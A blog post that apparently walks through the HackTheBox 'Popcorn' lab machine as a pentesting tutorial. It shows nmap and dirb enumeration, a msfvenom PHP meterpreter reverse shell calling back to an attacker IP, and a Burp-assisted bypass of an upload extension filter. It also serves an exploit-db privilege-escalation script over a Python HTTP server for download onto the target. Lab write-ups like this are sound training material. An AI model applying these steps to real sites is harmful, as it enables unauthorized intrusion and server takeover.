---
layout: post
title:  "How to hack a site through an uploader"
description: "Learn pentesting web from 0 with HackTheBox (Popcorn)"
date:   2019-04-01
image:  uploaderPopcorn.jpg
tags:  [Enumeration, Pentesting WEB, Escalation Privilege, Metasploit Framework]
---

Hello Hackers!!   
In this day, we will learn how to have total control over a web server, all thanks to a badly configured uploader.   
Before starting I want to clarify that all my published content is done for educational, informative and ethical purposes.  
I am not responsible for the misuse they may give you.    

## With this tutorial you will learn:
  - how to intercept requests with burpsuite.
  - how to bypass file upload restrictions using burp suite.
  - how to perform a simple port scan with Nmap.
  - how to get a meterpreter session with Metasploit.
  - how to perform a directory discovery with dirb.
  - How to perform an exploit search with Searchsploit.

To carry out this demonstration, we will perform a penetration test on a vulnerable machine called **Popcorn** published on the [HackTheBox](https://www.hackthebox.eu/home/machines/profile/4) platform.  
In any process to hack or have total control over a server in an unauthorized manner must start with a system enumeration.  
For this we will perform a simple scan with Nmap, in the following way.    

{% highlight zsh %}
╭─[~/Desktop/APOLO/Ethic4l-Hacking/Operations/Premiun/Popcorn]─[root@Arthorias]─[0]─[2734]
╰─[:)] # nmap -T4 -Pn -sV -F -sC -oN Popcorn.nmap 10.10.10.6
Starting Nmap 7.70 ( https://nmap.org ) at 2019-04-01 02:06 -05
Nmap scan report for 10.10.10.6
Host is up (0.20s latency).
Not shown: 98 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.1p1 Debian 6ubuntu2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 3e:c8:1b:15:21:15:50:ec:6e:63:bc:c5:6b:80:7b:38 (DSA)
|_  2048 aa:1f:79:21:b8:42:f4:8a:38:bd:b8:05:ef:1a:07:4d (RSA)
80/tcp open  http    Apache httpd 2.2.12 ((Ubuntu))
|_http-server-header: Apache/2.2.12 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

{% endhighlight %}  

With the results of the Nmap, we can identify that our victim has port 22 (SSH) and port 80 (HTTP) open.  
Knowing port 80 is open in the victim’s network we preferred to explore his IP in the browser but didn’t get any remarkable clue for the next step.  

<figure>
  <img src="{{site.baseurl}}/img/Port80Popcorn.png">
	<figcaption>
    <a href="{{site.baseurl}}/img/Port80Popcorn.png" title="Initial page running on port 80">Initial page running on port 80.</a>.
  </figcaption>
</figure>

The next step is to perform a directory discovery, for this I will use DIRB.   
DIRB is a Web Content Scanner. It looks for existing (and/or hidden) Web Objects. It basically works by launching a dictionary based attack against a web server and analyzing the response.
[Kali Linux](https://tools.kali.org/web-applications/dirb)  

{% highlight zsh %}
╭─[~/Desktop/APOLO/Ethic4l-Hacking/Operations/Premiun/Popcorn]─[root@Arthorias]─[0]─[2735]
╰─[:)] # dirb http://10.10.10.6 /usr/share/dirb/wordlists/common.txt 

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Mon Apr  1 02:06:49 2019
URL_BASE: http://10.10.10.6/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

---- Scanning URL: http://10.10.10.6/ ----
+ http://10.10.10.6/cgi-bin/ (CODE:403|SIZE:286)                                                                                                     
+ http://10.10.10.6/index (CODE:200|SIZE:177)                                                                                                        
+ http://10.10.10.6/index.html (CODE:200|SIZE:177)                                                                                                   
+ http://10.10.10.6/server-status (CODE:403|SIZE:291)                                                                                                
+ http://10.10.10.6/test (CODE:200|SIZE:47328)                                                                                                       
==> DIRECTORY: http://10.10.10.6/torrent/

---- Entering directory: http://10.10.10.6/torrent/ ----
==> DIRECTORY: http://10.10.10.6/torrent/admin/                                                                                                      
==> DIRECTORY: http://10.10.10.6/torrent/css/                                                                                                        
==> DIRECTORY: http://10.10.10.6/torrent/database/                                                                                                   
==> DIRECTORY: http://10.10.10.6/torrent/health/                                                                                                     
==> DIRECTORY: http://10.10.10.6/torrent/images/                                                                                                                                                                                              
==> DIRECTORY: http://10.10.10.6/torrent/js/                                                                                                         
==> DIRECTORY: http://10.10.10.6/torrent/lib/                                                                                                                                                                                                   
==> DIRECTORY: http://10.10.10.6/torrent/readme/                                                                                                                                                                                              
==> DIRECTORY: http://10.10.10.6/torrent/templates/                                                                                                  
==> DIRECTORY: http://10.10.10.6/torrent/torrents/                                                                                                   
==> DIRECTORY: http://10.10.10.6/torrent/upload/                                                                                                     
==> DIRECTORY: http://10.10.10.6/torrent/users/ 
{% endhighlight %}  

Knowing the above, we decided to explore http://10.10.10.6/torrent/ through browser URL and what we see is a Webpage shown below. 
After looking at the page for some clue, we saw that we need to register on this site first.  

<figure>
  <img src="{{site.baseurl}}/img/Port80PopcornTorrent.png">
        <figcaption>
    <a href="{{site.baseurl}}/img/Port80PopcornTorrent.png" title="Navigating in the directory /torrent">Navigating in the directory /torrent</a>.
  </figcaption>
</figure>

To continue, we will create a user in the information system by filling out the registration form.

<figure>
  <img src="{{site.baseurl}}/img/Port80PopcornCreateUser.png">
        <figcaption>
    <a href="{{site.baseurl}}/img/Port80PopcornCreateUser.png" title="Creating a user in the information system">Creating a user in the information system</a>.
  </figcaption>
</figure>

After successfully registering on the website; We managed to identify an uploader where apparently the correct use of this, is for the uploading of utorrent's and hosting them on the site.
The next step is to upload any uttorrent and then edit it, in this way we can find another uploader which will facilitate the upload of our malicious file.

<figure>
  <img src="{{site.baseurl}}/img/PopcornEditTorrent.png">
	<figcaption>
    <a href="{{site.baseurl}}/img/PopcornEditTorrent.png" title="Editing Torrent options and Uploading uttorrent">Editing Torrent options and Uploading uttorrent</a>.
  </figcaption>
</figure>

<figure>
  <img src="{{site.baseurl}}/img/PopcornEditTorrent2.png">
	<figcaption>
    <a href="{{site.baseurl}}/img/PopcornEditTorrent2.png" title="Editing Torrent options and Uploading uttorrent">Editing uttorrent uploaded</a>.
  </figcaption>
</figure>

Next, we are going to generate with Metasploit an exploit that allows us to connect through a reverse shell.  

{% highlight zsh %}
╭─[~/Desktop/APOLO/Ethic4l-Hacking/Operations/Premiun/Popcorn]─[root@Arthorias]─[0]─[2738]
╰─[:)] # msfvenom -p php/meterpreter/reverse_tcp lhost=10.10.14.4 lport=6969 -f raw > shell.php  
[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 1111 bytes
{% endhighlight %}

After generating our payload, we try to upload it to the server.
To avoid file filtering by extension that has the web server, which does not allow the upload of a file with PHP extension; what we must do is concatenate another extension that if valid on the name of our payload as follows:

<figure>
  <img src="{{site.baseurl}}/img/PopcornUploadShell.png">
	<figcaption>
    <a href="{{site.baseurl}}/img/PopcornUploadShell.png" title="How to bypass file upload restrictions">How to bypass file upload restrictions</a>.
  </figcaption>
</figure>

We are going to start a burpsuite instance, and then we intercept the request to manipulate the extension of our malicious file.

<figure>
  <img src="{{site.baseurl}}/img/PopcornBurpsuite.png">
	<figcaption>
    <a href="{{site.baseurl}}/img/PopcornBurpsuite.png" title="How to bypass file upload restrictions using burp suite">How to bypass file upload restrictions using burp suite</a>.
  </figcaption>
</figure>

Ok, we have our file uploaded to the victim web server.  

<figure>
  <img src="{{site.baseurl}}/img/PopcornFileUploaded.png">
	<figcaption>
    <a href="{{site.baseurl}}/img/PopcornFileUploaded.png" title="File with PHP extension uploaded">File with PHP extension uploaded</a>.
  </figcaption>
</figure>

Now what we must do is locate this file and access it from a browser, in order to obtain RCE on the machine.  
Among the results of the previous scan with DIRB, there was a route where the files would appear to be uploaded.  
So next we decided to explore http://10.10.10.6/torrent/upload/ through browser URL and what we see is a Webpage shown below.  

<figure>
  <img src="{{site.baseurl}}/img/PopcornFileUploaded2.png">
	<figcaption>
    <a href="{{site.baseurl}}/img/PopcornFileUploaded2.png" title="File with PHP extension uploaded">File with PHP extension uploaded</a>.
  </figcaption>
</figure>

We see that our file has been successfully uploaded.   
We click on our file, but first we must start the metasploit and tell it that we are going to wait for a connection.

<figure>
  <img src="{{site.baseurl}}/img/Popcornwww-data.png">
	<figcaption>
    <a href="{{site.baseurl}}/img/Popcornwww-data.png" title="RCE on Popcorn HackTheBox">RCE on Popcorn HackTheBox</a>.
  </figcaption>
</figure>

Ready friends!  
We can now execute commands on our server with the www-data user, thanks to our meterpreter session that we managed to obtain.

## Privilege Escalation  
Now that we have access to the server we are going to enumerate a bit.
Initially I managed to identify something interesting on the desktop.

<figure>
  <img src="{{site.baseurl}}/img/PopcornLsR.png">
	<figcaption>
    <a href="{{site.baseurl}}/img/PopcornLsR.png" title="Recursive list of files">Recursive list of files</a>.
  </figcaption>
</figure>

Apparently there is a folder called cache that contains a file with interesting name, we will perform a search for exploits with searchsploit indicating the name of the mentioned file.

<figure>
  <img src="{{site.baseurl}}/img/PopcornSearchsploit.png">
	<figcaption>
    <a href="{{site.baseurl}}/img/PopcornSearchsploit.png" title="Using Searchsploit">Using Searchsploit</a>.
  </figcaption>
</figure>

Interestingly, we find 3 results, and apparently 2 of them are used for the Privilege Escalation.
At this moment, what we have to do is copy the exploit from the searchsploit directory, and to avoid later errors we use **dos2unix** to run the exploit without problems on our victim machine.
On the other hand,  In order to upload the script to our victim, I will mount an HTTP server that hosts the script that will allow us to scale privileges.; later from the victim machine I will download the file using WGET.  
We go to the folder that contains our bash script and execute the following to mount an HTTP server with Python.  

{% highlight zsh %}
╭─[~/Desktop/APOLO/Ethic4l-Hacking/Operations/Premiun/Popcorn]─[root@Arthorias]─[0]─[2762]
╰─[:)] # cp /usr/share/exploitdb/exploits/linux/local/14339.sh ./                  
╭─[~/Desktop/APOLO/Ethic4l-Hacking/Operations/Premiun/Popcorn]─[root@Arthorias]─[0]─[2763]
╰─[:)] # ls
14339.sh  Popcorn.nmap  shell.php.png
╭─[~/Desktop/APOLO/Ethic4l-Hacking/Operations/Premiun/Popcorn]─[root@Arthorias]─[0]─[2764]
╰─[:)] # mv 14339.sh privesc.sh
╭─[~/Desktop/APOLO/Ethic4l-Hacking/Operations/Premiun/Popcorn]─[root@Arthorias]─[0]─[2765]
╰─[:)] # dos2unix privesc.sh 
dos2unix: converting file privesc.sh to Unix format...
╭─[~/Desktop/APOLO/Ethic4l-Hacking/Operations/Premiun/Popcorn]─[root@Arthorias]─[0]─[2766]
╰─[:)] # python3 -m http.server                                  
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
{% endhighlight %}  

After having published the exploit on our HTTP server, we downloaded it to our victim machine (Popcorn) and proceed with the execution of this as indicated below.

<script id="asciicast-238104" src="https://asciinema.org/a/238104.js" async></script>

And with this we conclude the tutorial of today.

